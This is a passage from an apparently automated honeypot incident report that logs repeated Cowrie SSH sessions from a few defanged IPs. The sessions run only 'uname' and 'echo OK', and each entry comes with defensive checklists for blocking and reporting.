| `2026-06-27 14:18:43` | `cowrie.command.input` |
| `2026-06-27 14:18:44` | `cowrie.log.closed` |
| `2026-06-27 14:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af0ea670fb32

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:19 |
| **Last Seen** | 2026-06-27 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:19:33` | `cowrie.session.connect` |
| `2026-06-27 14:19:33` | `cowrie.client.version` |
| `2026-06-27 14:19:33` | `cowrie.client.kex` |
| `2026-06-27 14:19:33` | `cowrie.login.success` |
| `2026-06-27 14:19:34` | `cowrie.session.params` |
| `2026-06-27 14:19:34` | `cowrie.command.input` |
| `2026-06-27 14:19:34` | `cowrie.log.closed` |
| `2026-06-27 14:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a14670614f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:20 |
| **Last Seen** | 2026-06-27 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:20:22` | `cowrie.session.connect` |
| `2026-06-27 14:20:22` | `cowrie.client.version` |
| `2026-06-27 14:20:22` | `cowrie.client.kex` |
| `2026-06-27 14:20:23` | `cowrie.login.success` |
| `2026-06-27 14:20:24` | `cowrie.session.params` |
| `2026-06-27 14:20:24` | `cowrie.command.input` |
| `2026-06-27 14:20:24` | `cowrie.log.closed` |
| `2026-06-27 14:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910a477d5ecb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:21 |
| **Last Seen** | 2026-06-27 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:21:13` | `cowrie.session.connect` |
| `2026-06-27 14:21:13` | `cowrie.client.version` |
| `2026-06-27 14:21:13` | `cowrie.client.kex` |
| `2026-06-27 14:21:13` | `cowrie.login.success` |
| `2026-06-27 14:21:14` | `cowrie.session.params` |
| `2026-06-27 14:21:14` | `cowrie.command.input` |
| `2026-06-27 14:21:14` | `cowrie.log.closed` |
| `2026-06-27 14:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42efc355ef10

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:22 |
| **Last Seen** | 2026-06-27 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:22:03` | `cowrie.session.connect` |
| `2026-06-27 14:22:03` | `cowrie.client.version` |
| `2026-06-27 14:22:03` | `cowrie.client.kex` |
| `2026-06-27 14:22:04` | `cowrie.login.success` |
| `2026-06-27 14:22:05` | `cowrie.session.params` |
| `2026-06-27 14:22:05` | `cowrie.command.input` |
| `2026-06-27 14:22:05` | `cowrie.log.closed` |
| `2026-06-27 14:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2ad094683e5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:22 |
| **Last Seen** | 2026-06-27 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:22:54` | `cowrie.session.connect` |
| `2026-06-27 14:22:54` | `cowrie.client.version` |
| `2026-06-27 14:22:55` | `cowrie.client.kex` |
| `2026-06-27 14:22:55` | `cowrie.login.success` |
| `2026-06-27 14:22:56` | `cowrie.session.params` |
| `2026-06-27 14:22:56` | `cowrie.command.input` |
| `2026-06-27 14:22:56` | `cowrie.log.closed` |
| `2026-06-27 14:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a859333f1df2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:23 |
| **Last Seen** | 2026-06-27 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:23:48` | `cowrie.session.connect` |
| `2026-06-27 14:23:48` | `cowrie.client.version` |
| `2026-06-27 14:23:48` | `cowrie.client.kex` |
| `2026-06-27 14:23:48` | `cowrie.login.success` |
| `2026-06-27 14:23:49` | `cowrie.session.params` |
| `2026-06-27 14:23:49` | `cowrie.command.input` |
| `2026-06-27 14:23:49` | `cowrie.log.closed` |
| `2026-06-27 14:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce72a0ba7ee0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:24 |
| **Last Seen** | 2026-06-27 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:24:42` | `cowrie.session.connect` |
| `2026-06-27 14:24:42` | `cowrie.client.version` |
| `2026-06-27 14:24:42` | `cowrie.client.kex` |
| `2026-06-27 14:24:42` | `cowrie.login.success` |
| `2026-06-27 14:24:43` | `cowrie.session.params` |
| `2026-06-27 14:24:43` | `cowrie.command.input` |
| `2026-06-27 14:24:43` | `cowrie.log.closed` |
| `2026-06-27 14:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed6dc17825f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:25 |
| **Last Seen** | 2026-06-27 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:25:32` | `cowrie.session.connect` |
| `2026-06-27 14:25:32` | `cowrie.client.version` |
| `2026-06-27 14:25:33` | `cowrie.client.kex` |
| `2026-06-27 14:25:33` | `cowrie.login.success` |
| `2026-06-27 14:25:34` | `cowrie.session.params` |
| `2026-06-27 14:25:34` | `cowrie.command.input` |
| `2026-06-27 14:25:34` | `cowrie.log.closed` |
| `2026-06-27 14:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f55ec7ca0d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 14:25 |
| **Last Seen** | 2026-06-27 14:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:25:54` | `cowrie.session.connect` |
| `2026-06-27 14:25:55` | `cowrie.client.version` |
| `2026-06-27 14:25:55` | `cowrie.client.kex` |
| `2026-06-27 14:26:01` | `cowrie.login.success` |
| `2026-06-27 14:26:04` | `cowrie.session.params` |
| `2026-06-27 14:26:04` | `cowrie.command.input` |
| `2026-06-27 14:26:06` | `cowrie.log.closed` |
| `2026-06-27 14:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2abbbe0cce40

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 14:26 |
| **Last Seen** | 2026-06-27 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:26:14` | `cowrie.session.connect` |
| `2026-06-27 14:26:15` | `cowrie.client.version` |
| `2026-06-27 14:26:15` | `cowrie.client.kex` |
| `2026-06-27 14:26:17` | `cowrie.login.success` |
| `2026-06-27 14:26:18` | `cowrie.session.params` |
| `2026-06-27 14:26:18` | `cowrie.command.input` |
| `2026-06-27 14:26:19` | `cowrie.log.closed` |
| `2026-06-27 14:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bd816113a7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:26 |
| **Last Seen** | 2026-06-27 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:26:23` | `cowrie.session.connect` |
| `2026-06-27 14:26:23` | `cowrie.client.version` |
| `2026-06-27 14:26:23` | `cowrie.client.kex` |
| `2026-06-27 14:26:23` | `cowrie.login.success` |
| `2026-06-27 14:26:24` | `cowrie.session.params` |
| `2026-06-27 14:26:24` | `cowrie.command.input` |
| `2026-06-27 14:26:24` | `cowrie.log.closed` |
| `2026-06-27 14:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73e84760bc0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:27 |
| **Last Seen** | 2026-06-27 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:27:13` | `cowrie.session.connect` |
| `2026-06-27 14:27:13` | `cowrie.client.version` |
| `2026-06-27 14:27:14` | `cowrie.client.kex` |
| `2026-06-27 14:27:14` | `cowrie.login.success` |
| `2026-06-27 14:27:15` | `cowrie.session.params` |
| `2026-06-27 14:27:15` | `cowrie.command.input` |
| `2026-06-27 14:27:15` | `cowrie.log.closed` |
| `2026-06-27 14:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f821fbe10cee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:28 |
| **Last Seen** | 2026-06-27 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:28:04` | `cowrie.session.connect` |
| `2026-06-27 14:28:04` | `cowrie.client.version` |
| `2026-06-27 14:28:04` | `cowrie.client.kex` |
| `2026-06-27 14:28:04` | `cowrie.login.success` |
| `2026-06-27 14:28:05` | `cowrie.session.params` |
| `2026-06-27 14:28:05` | `cowrie.command.input` |
| `2026-06-27 14:28:05` | `cowrie.log.closed` |
| `2026-06-27 14:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd57608d178

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:28 |
| **Last Seen** | 2026-06-27 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:28:55` | `cowrie.session.connect` |
| `2026-06-27 14:28:55` | `cowrie.client.version` |
| `2026-06-27 14:28:55` | `cowrie.client.kex` |
| `2026-06-27 14:28:55` | `cowrie.login.success` |
| `2026-06-27 14:28:56` | `cowrie.session.params` |
| `2026-06-27 14:28:56` | `cowrie.command.input` |
| `2026-06-27 14:28:56` | `cowrie.log.closed` |
| `2026-06-27 14:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534f845d142e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:29 |
| **Last Seen** | 2026-06-27 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:29:49` | `cowrie.session.connect` |
| `2026-06-27 14:29:49` | `cowrie.client.version` |
| `2026-06-27 14:29:49` | `cowrie.client.kex` |
| `2026-06-27 14:29:50` | `cowrie.login.success` |
| `2026-06-27 14:29:50` | `cowrie.session.params` |
| `2026-06-27 14:29:50` | `cowrie.command.input` |
| `2026-06-27 14:29:51` | `cowrie.log.closed` |
| `2026-06-27 14:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d124bf3d9f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:30 |
| **Last Seen** | 2026-06-27 14:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:30:43` | `cowrie.session.connect` |
| `2026-06-27 14:30:43` | `cowrie.client.version` |
| `2026-06-27 14:30:43` | `cowrie.client.kex` |
| `2026-06-27 14:30:44` | `cowrie.login.success` |
| `2026-06-27 14:30:45` | `cowrie.session.params` |
| `2026-06-27 14:30:45` | `cowrie.command.input` |
| `2026-06-27 14:30:45` | `cowrie.log.closed` |
| `2026-06-27 14:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f213bf1a3b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:31 |
| **Last Seen** | 2026-06-27 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:31:34` | `cowrie.session.connect` |
| `2026-06-27 14:31:34` | `cowrie.client.version` |
| `2026-06-27 14:31:34` | `cowrie.client.kex` |
| `2026-06-27 14:31:34` | `cowrie.login.success` |
| `2026-06-27 14:31:35` | `cowrie.session.params` |
| `2026-06-27 14:31:35` | `cowrie.command.input` |
| `2026-06-27 14:31:35` | `cowrie.log.closed` |
| `2026-06-27 14:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c987a92e1bff

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:32 |
| **Last Seen** | 2026-06-27 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:32:24` | `cowrie.session.connect` |
| `2026-06-27 14:32:24` | `cowrie.client.version` |
| `2026-06-27 14:32:25` | `cowrie.client.kex` |
| `2026-06-27 14:32:25` | `cowrie.login.success` |
| `2026-06-27 14:32:26` | `cowrie.session.params` |
| `2026-06-27 14:32:26` | `cowrie.command.input` |
| `2026-06-27 14:32:26` | `cowrie.log.closed` |
| `2026-06-27 14:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613dba8c6c1a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:33 |
| **Last Seen** | 2026-06-27 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:33:15` | `cowrie.session.connect` |
| `2026-06-27 14:33:15` | `cowrie.client.version` |
| `2026-06-27 14:33:16` | `cowrie.client.kex` |
| `2026-06-27 14:33:16` | `cowrie.login.success` |
| `2026-06-27 14:33:17` | `cowrie.session.params` |
| `2026-06-27 14:33:17` | `cowrie.command.input` |
| `2026-06-27 14:33:17` | `cowrie.log.closed` |
| `2026-06-27 14:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8a81c15c119

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:34 |
| **Last Seen** | 2026-06-27 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:34:07` | `cowrie.session.connect` |
| `2026-06-27 14:34:07` | `cowrie.client.version` |
| `2026-06-27 14:34:07` | `cowrie.client.kex` |
| `2026-06-27 14:34:07` | `cowrie.login.success` |
| `2026-06-27 14:34:08` | `cowrie.session.params` |
| `2026-06-27 14:34:08` | `cowrie.command.input` |
| `2026-06-27 14:34:08` | `cowrie.log.closed` |
| `2026-06-27 14:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc772ca6709

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:34 |
| **Last Seen** | 2026-06-27 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:34:59` | `cowrie.session.connect` |
| `2026-06-27 14:34:59` | `cowrie.client.version` |
| `2026-06-27 14:34:59` | `cowrie.client.kex` |
| `2026-06-27 14:34:59` | `cowrie.login.success` |
| `2026-06-27 14:35:00` | `cowrie.session.params` |
| `2026-06-27 14:35:00` | `cowrie.command.input` |
| `2026-06-27 14:35:00` | `cowrie.log.closed` |
| `2026-06-27 14:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2654fa4375b5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:35 |
| **Last Seen** | 2026-06-27 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:35:52` | `cowrie.session.connect` |
| `2026-06-27 14:35:52` | `cowrie.client.version` |
| `2026-06-27 14:35:52` | `cowrie.client.kex` |
| `2026-06-27 14:35:53` | `cowrie.login.success` |
| `2026-06-27 14:35:53` | `cowrie.session.params` |
| `2026-06-27 14:35:53` | `cowrie.command.input` |
| `2026-06-27 14:35:53` | `cowrie.log.closed` |
| `2026-06-27 14:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd3df5a2e82

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:36 |
| **Last Seen** | 2026-06-27 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:36:46` | `cowrie.session.connect` |
| `2026-06-27 14:36:46` | `cowrie.client.version` |
| `2026-06-27 14:36:46` | `cowrie.client.kex` |
| `2026-06-27 14:36:46` | `cowrie.login.success` |
| `2026-06-27 14:36:47` | `cowrie.session.params` |
| `2026-06-27 14:36:47` | `cowrie.command.input` |
| `2026-06-27 14:36:47` | `cowrie.log.closed` |
| `2026-06-27 14:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6803490d4c39

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:37 |
| **Last Seen** | 2026-06-27 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:37:40` | `cowrie.session.connect` |
| `2026-06-27 14:37:40` | `cowrie.client.version` |
| `2026-06-27 14:37:40` | `cowrie.client.kex` |
| `2026-06-27 14:37:41` | `cowrie.login.success` |
| `2026-06-27 14:37:42` | `cowrie.session.params` |
| `2026-06-27 14:37:42` | `cowrie.command.input` |
| `2026-06-27 14:37:42` | `cowrie.log.closed` |
| `2026-06-27 14:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7a6b9860a7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 14:37 |
| **Last Seen** | 2026-06-27 14:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:37:50` | `cowrie.session.connect` |
| `2026-06-27 14:37:51` | `cowrie.client.version` |
| `2026-06-27 14:37:51` | `cowrie.client.kex` |
| `2026-06-27 14:37:58` | `cowrie.login.success` |
| `2026-06-27 14:38:01` | `cowrie.session.params` |
| `2026-06-27 14:38:01` | `cowrie.command.input` |
| `2026-06-27 14:38:03` | `cowrie.log.closed` |
| `2026-06-27 14:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf75e0b7fbe

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:38 |
| **Last Seen** | 2026-06-27 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

